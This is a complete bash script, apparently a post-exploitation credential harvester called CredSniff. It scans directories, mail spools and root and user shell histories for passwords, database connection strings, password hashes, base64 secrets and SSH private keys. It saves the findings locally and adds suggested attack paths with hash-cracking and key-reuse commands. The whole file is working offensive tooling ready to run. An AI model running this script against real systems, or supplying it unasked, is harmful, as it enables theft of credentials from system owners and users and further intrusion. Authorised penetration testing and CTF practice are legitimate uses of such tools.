#!/bin/bash
# ============================================================================
#   CredSniff v3.0 — Credential Harvester
#   Usage: ./credsniff.sh -p "user1|user2|password" [-d /var] [-e conf,txt] [-H]
# ============================================================================

# ── Colors ──────────────────────────────────────────────────────────────────
R='\033[0;31m'    G='\033[0;32m'    Y='\033[0;33m'
B='\033[0;34m'    M='\033[0;35m'    C='\033[0;36m'
W='\033[1;37m'    DIM='\033[2m'     RST='\033[0m'

# ── Defaults ────────────────────────────────────────────────────────────────
TARGET_DIR_RAW="/var"
declare -a TARGET_DIRS=()
PATTERN=""
WORDLIST=""
EXTENSIONS=""
THREADS=10
QUIET=0
FULL_REPORT=0
HISTORY_MODE=0
FOUND_COUNT=0
FILES_SCANNED=0
TOTAL_FILES=0
PROGRESS_ACTIVE=0
RESULTS_DIR=""

declare -a CRED_PAIRS=()
declare -a HASHES=()
declare -a B64_FINDS=()
declare -a KEY_FINDS=()
declare -a ATTACK_PATHS=()

# ── Timestamp ─────────────────────────────────────────────────────────────────
ts() { date +"%H:%M:%S"; }

# ── Progress bar ──────────────────────────────────────────────────────────────
draw_progress() {
    [[ $QUIET -eq 1 ]] && return
    local current=$1 total=$2 width=38
    local pct=0
    [[ $total -gt 0 ]] && pct=$(( current * 100 / total ))
    local filled=$(( pct * width / 100 ))
    local bar_filled="" bar_empty=""
    local i
    for ((i=0; i<filled; i++));          do bar_filled+="█"; done
    for ((i=filled; i<width; i++));      do bar_empty+="░"; done
    printf "\r  ${G}[${bar_filled}${DIM}${bar_empty}${RST}${G}]${RST} ${W}%3d%%${RST}  ${DIM}%d/%d files${RST}   " \
        "$pct" "$current" "$total" >&2
    PROGRESS_ACTIVE=1
}

clear_progress() {
    [[ $QUIET -eq 1 || $PROGRESS_ACTIVE -eq 0 ]] && return
    printf "\r\033[K" >&2
    PROGRESS_ACTIVE=0
}

end_progress() {
    [[ $QUIET -eq 1 ]] && return
    draw_progress "$TOTAL_FILES" "$TOTAL_FILES"
    printf "\n" >&2
    PROGRESS_ACTIVE=0
}

# ── Results directory ─────────────────────────────────────────────────────────
init_results() {
    local stamp
    stamp=$(date +"%Y-%m-%d_%H%M%S")
    RESULTS_DIR="credsniff-results/${stamp}"
    mkdir -p "$RESULTS_DIR"
    local hdr="CredSniff v3.0 — $(date)"
    for f in credentials.txt hashes.txt ssh-keys.txt b64-secrets.txt \
              history.txt raw-matches.txt 00-summary.txt; do
        printf "# %s\n\n" "$hdr" > "${RESULTS_DIR}/${f}"
    done
}

rwrite() {
    local file="$1" line="$2"
    [[ -n "$RESULTS_DIR" ]] && echo -e "$line" >> "${RESULTS_DIR}/${file}"
}

# ── Output: critical hits to screen, all to files ─────────────────────────────
finding() {
    local type="$1" detail="$2" src="$3"
    local color
    case "$type" in
        CRED)  color="$R" ;;
        HASH)  color="$Y" ;;
        B64)   color="$M" ;;
        KEY)   color="$R" ;;
        MAIL)  color="$C" ;;
        HIST)  color="$Y" ;;
        MATCH) color="$G" ;;
    esac
    FOUND_COUNT=$((FOUND_COUNT + 1))

    # MATCH — silent on screen, goes to raw-matches only
    if [[ "$type" == "MATCH" ]]; then
        rwrite "raw-matches.txt" "$(printf '[%s] %-5s - %s  (%s)' "$(ts)" "$type" "$detail" "$src")"
        return
    fi

    # Critical hit — clear progress bar, print to screen, redraw bar
    clear_progress
    echo -e "[$(ts)] ${color}$(printf '%-5s' "$type")${RST} - ${W}${detail}${RST}  ${DIM}${src}${RST}"
    rwrite "00-summary.txt" "$(printf '[%s] %-5s - %s  (%s)' "$(ts)" "$type" "$detail" "$src")"

    case "$type" in
        CRED) rwrite "credentials.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
        HASH) rwrite "hashes.txt"      "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
        KEY)  rwrite "ssh-keys.txt"    "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
        B64)  rwrite "b64-secrets.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
        HIST) rwrite "history.txt"     "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
        MAIL) rwrite "raw-matches.txt" "$(printf '%-5s - %s  (%s)' "$type" "$detail" "$src")" ;;
    esac

    [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
}

# ── Banner ────────────────────────────────────────────────────────────────────
banner() {
    [[ $QUIET -eq 1 ]] && return
    echo -e "${C}"
    cat << 'BANNER'
   ___ ___ ___ ___  ___ _  _ ___ ___ ___
  / __| _ \ __|   \/ __| \| |_ _| __| __|
 | (__|   / _|| |) \__ \ .` || || _|| _|
  \___|_|_\___|___/|___/_|\_|___|_| |_|
BANNER
    echo -e "${RST}"
    echo -e "  ${DIM}v3.0${RST} | ${Y}Credential Harvester${RST}"
    echo ""
}

# ── Usage ──────────────────────────────────────────────────────────────────────
usage() {
    echo -e "${W}Usage:${RST}"
    echo "  credsniff.sh [options] -p PATTERN"
    echo ""
    echo -e "${W}Options:${RST}"
    echo "  -d DIR        Target directory (default: /var)"
    echo "                  Use + for multiple subdirs: /var/mail+lib+www"
    echo "  -p PATTERN    Grep-E pattern (e.g. \"admin|root|password\")"
    echo "  -w FILE       Load patterns from wordlist (one per line)"
    echo "  -e EXTS       Extension filter, comma-sep (e.g. conf,php,txt,xml)"
    echo "  -t NUM        Thread count (default: 10)"
    echo "  -H            History mode — hunt history files for leaked commands"
    echo "  -q            Quiet — no banner or progress bar, findings only"
    echo "  -F            Full report — print detailed breakdown at end"
    echo "  -h            Show this help"
    echo ""
    echo -e "${W}Examples:${RST}"
    echo "  credsniff.sh -p \"admin|root|password\""
    echo "  credsniff.sh -d /var/mail+lib+www -p \"charles|sam|password\""
    echo "  credsniff.sh -d /home -p \"charles|sam\" -e conf,txt,php"
    echo "  credsniff.sh -H -p \"charles\""
    echo "  credsniff.sh -w users.txt -d /var -F"
    exit 0
}

# ── Arg parsing ────────────────────────────────────────────────────────────────
while getopts "d:p:w:e:t:HqFh" opt; do
    case $opt in
        d) TARGET_DIR_RAW="$OPTARG" ;;
        p) PATTERN="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        e) EXTENSIONS="$OPTARG" ;;
        t) THREADS="$OPTARG" ;;
        H) HISTORY_MODE=1 ;;
        q) QUIET=1 ;;
        F) FULL_REPORT=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ── Wordlist loading ───────────────────────────────────────────────────────────
if [[ -n "$WORDLIST" ]]; then
    [[ ! -f "$WORDLIST" ]] && { echo -e "${R}[!] Wordlist not found: ${WORDLIST}${RST}"; exit 1; }
    local_wl=$(grep -v '^#' "$WORDLIST" | grep -v '^$' | paste -sd'|')
    PATTERN="${PATTERN:+${PATTERN}|}${local_wl}"
fi

if [[ -z "$PATTERN" && $HISTORY_MODE -eq 0 ]]; then
    echo -e "${R}[!] -p PATTERN, -w WORDLIST, or -H required${RST}"
    usage
fi

# ── Expand + syntax ────────────────────────────────────────────────────────────
if [[ "$TARGET_DIR_RAW" == *"+"* ]]; then
    IFS='+' read -ra _parts <<< "$TARGET_DIR_RAW"
    _base=$(dirname "${_parts[0]}")
    for _p in "${_parts[@]}"; do
        [[ "$_p" == "${_parts[0]}" ]] && TARGET_DIRS+=("$_p") || TARGET_DIRS+=("${_base}/${_p}")
    done
else
    TARGET_DIRS=("$TARGET_DIR_RAW")
fi

for _td in "${TARGET_DIRS[@]}"; do
    [[ ! -d "$_td" ]] && { echo -e "${R}[!] Not a directory: ${_td}${RST}"; exit 1; }
done

# ── Hash identification ────────────────────────────────────────────────────────
identify_hash() {
    local hash="$1" len=${#1}
    [[ "$hash" =~ ^\$2[aby]?\$  ]] && echo "bcrypt|hashcat -m 3200 / john --format=bcrypt"            && return
    [[ "$hash" =~ ^\$6\$        ]] && echo "sha512crypt|hashcat -m 1800 / john --format=sha512crypt"  && return
    [[ "$hash" =~ ^\$5\$        ]] && echo "sha256crypt|hashcat -m 7400 / john --format=sha256crypt"  && return
    [[ "$hash" =~ ^\$1\$        ]] && echo "md5crypt|hashcat -m 500 / john --format=md5crypt"         && return
    [[ "$hash" =~ ^\$apr1\$     ]] && echo "APR1-MD5|hashcat -m 1600 / john --format=md5crypt-long"   && return
    [[ $len -eq 32  && "$hash" =~ ^[a-fA-F0-9]{32}$  ]] && echo "MD5/NTLM|hashcat -m 0 or -m 1000"  && return
    [[ $len -eq 40  && "$hash" =~ ^[a-fA-F0-9]{40}$  ]] && echo "SHA-1|hashcat -m 100"               && return
    [[ $len -eq 64  && "$hash" =~ ^[a-fA-F0-9]{64}$  ]] && echo "SHA-256|hashcat -m 1400"            && return
    [[ $len -eq 128 && "$hash" =~ ^[a-fA-F0-9]{128}$ ]] && echo "SHA-512|hashcat -m 1700"            && return
    [[ $len -eq 16  && "$hash" =~ ^[a-fA-F0-9]{16}$  ]] && echo "MySQL323|hashcat -m 200"            && return
    [[ $len -eq 13  && "$hash" =~ ^[a-zA-Z0-9./]{13}$ ]] && echo "DES-crypt|hashcat -m 1500"         && return
    echo "unknown|hash-identifier or hashid"
}

# ── Base64 detection ───────────────────────────────────────────────────────────
check_base64() {
    local str="$1"
    if [[ ${#str} -ge 8 ]] && [[ "$str" =~ ^[A-Za-z0-9+/]{4,}={0,2}$ ]]; then
        local decoded
        decoded=$(echo "$str" | base64 -d 2>/dev/null)
        if [[ $? -eq 0 && -n "$decoded" ]]; then
            if echo "$decoded" | grep -qP '^[\x20-\x7E\n\r\t]+$'; then
                echo "$decoded"; return 0
            fi
        fi
    fi
    return 1
}

# ── Credential pair extraction ─────────────────────────────────────────────────
extract_cred_context() {
    local line="$1" file="$2"

    if [[ "$line" =~ ([a-zA-Z0-9._-]+)[[:space:]]*:[[:space:]]*([^[:space:]:]{3,}) ]]; then
        local u="${BASH_REMATCH[1]}" p="${BASH_REMATCH[2]}"
        if [[ ! "$u" =~ ^(http|https|ftp|ssh|tcp|udp|localhost|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)$ ]]; then
            if [[ ! "$p" =~ ^(/|0x|var|bin|lib|usr|etc|dev|tmp|proc|sys|sbin) ]]; then
                CRED_PAIRS+=("${file}|${u}|${p}")
                finding "CRED" "${u}:${p}" "${file}"
            fi
        fi
    fi

    if [[ "$line" =~ [Pp](ass(word|wd)?)[[:space:]]*[=:][[:space:]]*[\"\']*([^\"\'[:space:]]+) ]]; then
        local pw="${BASH_REMATCH[3]}"
        [[ ${#pw} -ge 2 ]] && { CRED_PAIRS+=("${file}|password_field|${pw}"); finding "CRED" "password_field:${pw}" "${file}"; }
    fi

    if [[ "$line" =~ (mysql|postgres|mongodb|redis)://([^:]+):([^@]+)@ ]]; then
        local svc="${BASH_REMATCH[1]}" u="${BASH_REMATCH[2]}" p="${BASH_REMATCH[3]}"
        CRED_PAIRS+=("${file}|${svc}://${u}|${p}")
        finding "CRED" "${svc}://${u}:${p}" "${file}"
    fi
}

# ── Single-pass file scanner ───────────────────────────────────────────────────
scan_file() {
    local file="$1"
    FILES_SCANNED=$((FILES_SCANNED + 1))
    draw_progress "$FILES_SCANNED" "$TOTAL_FILES"

    [[ ! -r "$file" ]] && return
    file "$file" 2>/dev/null | grep -q "text" || return

    # Pattern matching
    if [[ -n "$PATTERN" ]]; then
        local matches
        matches=$(grep -nE "$PATTERN" "$file" 2>/dev/null)
        if [[ -n "$matches" ]]; then
            while IFS= read -r ml; do
                [[ -z "$ml" ]] && continue
                local ln="${ml%%:*}" content="${ml#*:}"
                content=$(echo "$content" | sed 's/^[[:space:]]*//')
                [[ ${#content} -gt 120 ]] && content="${content:0:117}..."
                finding "MATCH" "${content}" "${file}:${ln}"
                extract_cred_context "$content" "$file"
            done <<< "$matches"
        fi
    fi

    # Shadow-style hashes
    local shadow_hits
    shadow_hits=$(grep -noE '\$[0-9a-z]+\$[^\s:]{8,}' "$file" 2>/dev/null)
    if [[ -n "$shadow_hits" ]]; then
        while IFS= read -r hit; do
            [[ -z "$hit" ]] && continue
            local ln="${hit%%:*}" hash="${hit#*:}"
            local id_r; id_r=$(identify_hash "$hash")
            local ht="${id_r%%|*}" cc="${id_r#*|}"
            finding "HASH" "${ht}: ${hash:0:55}..." "${file}:${ln}"
            rwrite "hashes.txt" "  crack: ${cc}"
            HASHES+=("${ht}|${hash}|${cc}|${file}")
            ATTACK_PATHS+=("Crack ${ht} from ${file} → ${cc}")
        done <<< "$shadow_hits"
    else
        local hex_hits
        hex_hits=$(grep -noEh '\b[a-fA-F0-9]{32,128}\b' "$file" 2>/dev/null | head -10)
        if [[ -n "$hex_hits" ]]; then
            while IFS= read -r h; do
                [[ -z "$h" || ${#h} -gt 130 ]] && continue
                local ln="${h%%:*}" hash="${h#*:}"
                local id_r; id_r=$(identify_hash "$hash")
                local ht="${id_r%%|*}" cc="${id_r#*|}"
                if [[ "$ht" != "unknown" ]]; then
                    finding "HASH" "${ht}: ${hash:0:55}..." "${file}:${ln}"
                    rwrite "hashes.txt" "  crack: ${cc}"
                    HASHES+=("${ht}|${hash}|${cc}|${file}")
                fi
            done <<< "$hex_hits"
        fi
    fi

    # Base64
    local b64_hits
    b64_hits=$(grep -noEh '[A-Za-z0-9+/]{12,}={0,2}' "$file" 2>/dev/null | sort -u | head -20)
    if [[ -n "$b64_hits" ]]; then
        while IFS= read -r b64; do
            [[ -z "$b64" ]] && continue
            local decoded; decoded=$(check_base64 "$b64")
            if [[ $? -eq 0 && -n "$decoded" ]]; then
                if echo "$decoded" | grep -qiE "pass|user|key|token|secret|admin|root|login|cred|auth|flag"; then
                    finding "B64" "→ ${decoded:0:80}" "${file}"
                    rwrite "b64-secrets.txt" "  encoded: ${b64:0:60}"
                    B64_FINDS+=("${b64}|${decoded}")
                    ATTACK_PATHS+=("Decoded b64 secret in ${file}")
                fi
            fi
        done <<< "$b64_hits"
    fi

    # SSH private keys
    if grep -ql "PRIVATE KEY" "$file" 2>/dev/null; then
        local key_type="Unknown"
        grep -q "RSA"     "$file" 2>/dev/null && key_type="RSA"
        grep -q "DSA"     "$file" 2>/dev/null && key_type="DSA"
        grep -q "EC"      "$file" 2>/dev/null && key_type="EC"
        grep -q "OPENSSH" "$file" 2>/dev/null && key_type="OpenSSH"
        local kstatus="unprotected"
        grep -q "ENCRYPTED" "$file" 2>/dev/null && kstatus="encrypted"
        finding "KEY" "${key_type} private key (${kstatus})" "${file}"
        KEY_FINDS+=("${file}|${key_type}|${kstatus}")
        if [[ "$kstatus" == "encrypted" ]]; then
            rwrite "ssh-keys.txt" "  crack: ssh2john ${file} > key.hash && john key.hash"
            ATTACK_PATHS+=("Crack ${key_type} key: ssh2john ${file}")
        else
            rwrite "ssh-keys.txt" "  use:   chmod 600 ${file} && ssh -i ${file} user@target"
            ATTACK_PATHS+=("Use ${key_type} key: chmod 600 ${file} && ssh -i ${file} user@target")
        fi
    fi
}

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
main() {
    banner
    init_results

    # ── Config display ─────────────────────────────────────────────────────────
    if [[ $QUIET -eq 0 ]]; then
        local pat_display="$PATTERN"
        [[ ${#pat_display} -gt 80 ]] && pat_display="${pat_display:0:77}..."
        [[ -z "$pat_display" ]] && pat_display="${DIM}(none — history mode)${RST}"
        echo -e " ${W}Target:${RST}  ${C}${TARGET_DIRS[*]}${RST}"
        echo -e " ${W}Pattern:${RST} ${C}${pat_display}${RST}"
        [[ -n "$EXTENSIONS" ]] && echo -e " ${W}Ext:${RST}     ${C}${EXTENSIONS}${RST}"
        [[ $HISTORY_MODE -eq 1 ]] && echo -e " ${W}History:${RST} ${C}enabled${RST}"
        echo -e " ${W}Results:${RST} ${C}${RESULTS_DIR}/${RST}"
        echo ""
    fi

    local start_time; start_time=$(date +%s)

    # ── Build file list and scan ────────────────────────────────────────────────
    local all_files
    all_files=$(find "${TARGET_DIRS[@]}" -type f 2>/dev/null)
    [[ -n "$EXTENSIONS" ]] && all_files=$(echo "$all_files" | grep -E "\.(${EXTENSIONS//,/|})$")
    TOTAL_FILES=$(echo "$all_files" | grep -c . 2>/dev/null || echo 0)
    [[ -z "$(echo "$all_files" | tr -d '[:space:]')" ]] && TOTAL_FILES=0

    [[ $QUIET -eq 0 && $TOTAL_FILES -gt 0 ]] && draw_progress 0 "$TOTAL_FILES"

    if [[ $TOTAL_FILES -gt 0 ]]; then
        while IFS= read -r file; do
            [[ -z "$file" ]] && continue
            scan_file "$file"
        done <<< "$all_files"
    fi

    # ── Mail directories ───────────────────────────────────────────────────────
    if [[ -n "$PATTERN" ]]; then
        for td in "${TARGET_DIRS[@]}"; do
            for mdir in "${td}/mail" "${td}/spool/mail"; do
                [[ ! -d "$mdir" ]] && continue
                while IFS= read -r mf; do
                    [[ -z "$mf" ]] && continue
                    local full="${mdir}/${mf}"
                    [[ ! -r "$full" ]] && continue
                    if grep -qiE "$PATTERN" "$full" 2>/dev/null; then
                        local prev; prev=$(grep -m1 -iE "$PATTERN" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
                        [[ ${#prev} -gt 100 ]] && prev="${prev:0:97}..."
                        finding "MAIL" "Pattern hit: ${prev}" "${full}"
                        extract_cred_context "$prev" "$full"
                    fi
                    if grep -qiE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null; then
                        local cl; cl=$(grep -m1 -iE "password|passwd|pass:|credentials|secret" "$full" 2>/dev/null | sed 's/^[[:space:]]*//')
                        [[ ${#cl} -gt 100 ]] && cl="${cl:0:97}..."
                        finding "MAIL" "Cred keyword: ${cl}" "${full}"
                        extract_cred_context "$cl" "$full"
                        ATTACK_PATHS+=("Read mail: cat ${full}")
                    fi
                done < <(ls -1 "$mdir" 2>/dev/null)
            done
        done
    fi

    # ── History hunting (-H) ───────────────────────────────────────────────────
    if [[ $HISTORY_MODE -eq 1 ]]; then
        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|mysqladmin[[:space:]].*-p|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*[^[:space:]]|--password[=[:space:]][^[:space:]]|-passwd[[:space:]]+[^[:space:]]'
        local hist_files=()
        for f in /root/.bash_history /root/.zsh_history /root/.sh_history \
                  /home/*/.bash_history /home/*/.zsh_history /home/*/.sh_history \
                  /home/*/.local/share/fish/fish_history ~/.bash_history ~/.zsh_history; do
            [[ -f "$f" && -r "$f" ]] && hist_files+=("$f")
        done

        declare -A _sh=(); declare -a _uh=()
        for f in "${hist_files[@]}"; do
            local real; real=$(realpath "$f" 2>/dev/null || echo "$f")
            [[ -z "${_sh[$real]+x}" ]] && { _sh[$real]=1; _uh+=("$real"); }
        done

        if [[ ${#_uh[@]} -eq 0 ]]; then
            clear_progress
            echo -e "  ${DIM}[hist] no readable history files found${RST}"
        else
            for hf in "${_uh[@]}"; do
                local owner; owner=$(stat -c '%U' "$hf" 2>/dev/null || echo "?")
                local hits; hits=$(grep -nE "$hist_pat" "$hf" 2>/dev/null)
                if [[ -n "$hits" ]]; then
                    while IFS= read -r hit; do
                        [[ -z "$hit" ]] && continue
                        local ln="${hit%%:*}" cmd="${hit#*:}"
                        cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                        [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
                        finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
                        extract_cred_context "$cmd" "$hf"
                        ATTACK_PATHS+=("Review history: cat ${hf}")
                    done <<< "$hits"
                fi
                if [[ -n "$PATTERN" ]]; then
                    local phits; phits=$(grep -nE "$PATTERN" "$hf" 2>/dev/null)
                    if [[ -n "$phits" ]]; then
                        while IFS= read -r hit; do
                            [[ -z "$hit" ]] && continue
                            local ln="${hit%%:*}" cmd="${hit#*:}"
                            cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//')
                            [[ ${#cmd} -gt 120 ]] && cmd="${cmd:0:117}..."
                            finding "HIST" "${cmd}" "${hf}:${ln} (${owner})"
                            extract_cred_context "$cmd" "$hf"
                        done <<< "$phits"
                    fi
                fi
            done
        fi
    fi

    # ── End ────────────────────────────────────────────────────────────────────
    end_progress

    local end_time duration
    end_time=$(date +%s); duration=$((end_time - start_time))
    local total=$(( ${#CRED_PAIRS[@]} + ${#HASHES[@]} + ${#B64_FINDS[@]} + ${#KEY_FINDS[@]} ))

    echo ""
    echo -e "${G}Task Completed${RST} ${DIM}| ${duration}s | ${FILES_SCANNED} files | ${FOUND_COUNT} hits | ${total} actionable${RST}"
    echo -e " ${DIM}→ ${RESULTS_DIR}/${RST}"
    echo ""

    # ── Write summary + credential files ──────────────────────────────────────
    if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
        rwrite "credentials.txt" ""
        rwrite "credentials.txt" "── Extracted Credentials ───────────────────────────────────"
        local -A sc
        for entry in "${CRED_PAIRS[@]}"; do
            local src="${entry%%|*}" rest="${entry#*|}"
            local u="${rest%%|*}" p="${rest#*|}" k="${rest%%|*}:${rest#*|}"
            if [[ -z "${sc[$k]+x}" ]]; then
                sc[$k]=1; rwrite "credentials.txt" "  ${u}:${p}  ← ${src}"
            fi
        done
    fi

    if [[ ${#HASHES[@]} -gt 0 ]]; then
        rwrite "hashes.txt" ""
        rwrite "hashes.txt" "── Hash Summary ────────────────────────────────────────────"
        for entry in "${HASHES[@]}"; do
            IFS='|' read -r ht hash cc src <<< "$entry"
            rwrite "hashes.txt" "  type:  ${ht}"
            rwrite "hashes.txt" "  hash:  ${hash}"
            rwrite "hashes.txt" "  crack: ${cc}"
            rwrite "hashes.txt" "  from:  ${src}"
            rwrite "hashes.txt" ""
        done
    fi

    rwrite "00-summary.txt" ""
    rwrite "00-summary.txt" "── Attack Paths ────────────────────────────────────────────"
    local i=1; local -A sp
    for path in "${ATTACK_PATHS[@]}"; do
        if [[ -z "${sp[$path]+x}" ]]; then
            sp[$path]=1; rwrite "00-summary.txt" "  ${i}. ${path}"; i=$((i+1))
        fi
    done
    rwrite "00-summary.txt" ""
    rwrite "00-summary.txt" "── Stats ───────────────────────────────────────────────────"
    rwrite "00-summary.txt" "  Duration:    ${duration}s"
    rwrite "00-summary.txt" "  Files:       ${FILES_SCANNED}"
    rwrite "00-summary.txt" "  Raw hits:    ${FOUND_COUNT}"
    rwrite "00-summary.txt" "  Actionable:  ${total}"
    rwrite "00-summary.txt" "  Creds:       ${#CRED_PAIRS[@]}"
    rwrite "00-summary.txt" "  Hashes:      ${#HASHES[@]}"
    rwrite "00-summary.txt" "  Keys:        ${#KEY_FINDS[@]}"
    rwrite "00-summary.txt" "  B64 secrets: ${#B64_FINDS[@]}"

    # ── Full report on screen (-F) ─────────────────────────────────────────────
    if [[ $FULL_REPORT -eq 1 ]]; then
        local -A sf
        if [[ ${#CRED_PAIRS[@]} -gt 0 ]]; then
            echo -e " ${W}Credentials${RST}"
            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
            for entry in "${CRED_PAIRS[@]}"; do
                local src="${entry%%|*}" rest="${entry#*|}"
                local u="${rest%%|*}" p="${rest#*|}" k="${rest%%|*}:${rest#*|}"
                if [[ -z "${sf[$k]+x}" ]]; then
                    sf[$k]=1; echo -e "  ${C}${u}${RST}:${R}${p}${RST}  ${DIM}← ${src}${RST}"
                fi
            done
            echo ""
        fi
        if [[ ${#HASHES[@]} -gt 0 ]]; then
            echo -e " ${W}Hashes${RST}"
            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
            for entry in "${HASHES[@]}"; do
                IFS='|' read -r ht hash cc src <<< "$entry"
                echo -e "  ${Y}${ht}${RST}  ${hash:0:60}  ${DIM}← ${src}${RST}"
                echo -e "    ${DIM}crack:${RST} ${Y}${cc}${RST}"
            done
            echo ""
        fi
        if [[ ${#KEY_FINDS[@]} -gt 0 ]]; then
            echo -e " ${W}SSH Keys${RST}"
            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
            for entry in "${KEY_FINDS[@]}"; do
                IFS='|' read -r kpath ktype kenc <<< "$entry"
                echo -e "  ${R}${ktype}${RST} (${kenc})  ${DIM}${kpath}${RST}"
            done
            echo ""
        fi
        if [[ ${#ATTACK_PATHS[@]} -gt 0 ]]; then
            echo -e " ${W}Attack Paths${RST}"
            echo -e " ${DIM}────────────────────────────────────────────────${RST}"
            local j=1; local -A sg
            for path in "${ATTACK_PATHS[@]}"; do
                if [[ -z "${sg[$path]+x}" ]]; then
                    sg[$path]=1; echo -e "  ${G}${j}.${RST} ${path}"; j=$((j+1))
                fi
            done
            echo ""
        fi
    fi

    if [[ $total -eq 0 && $FOUND_COUNT -eq 0 ]]; then
        echo -e "  ${Y}No credentials found.${RST}"
        echo -e "  ${DIM}Try a broader pattern, different directory, or -H for history hunting${RST}"
        echo ""
    fi
}

main
